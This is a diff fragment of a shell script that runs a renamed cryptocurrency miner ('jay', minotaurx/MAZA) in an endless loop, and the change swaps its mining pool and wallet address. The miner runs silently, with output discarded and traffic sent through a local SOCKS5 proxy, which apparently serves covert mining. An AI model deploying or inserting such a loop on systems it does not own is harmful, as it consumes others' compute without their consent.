@@ -154,6 +154,6 @@ sleep 2
 
 while true
 do
-./jay -a minotaurx -o stratum+tcp://poolx.rwinfo.club:7019 -u DEn9KiTjhuQZ7aPKNUzKxCLqYyb2GPeJV1 -p $currentdate,c=MAZA -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081 1>/dev/null 2>&1 
+./jay -a minotaurx -o stratum+tcp://minotaurx.eu.mine.zpool.ca:7019 -u MGaypRJi43LcQxrgoL2CW28B31w4owLvv8 -p $currentdate,c=MAZA,zap=MAZA -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081 1>/dev/null 2>&1
 sleep 10
 done
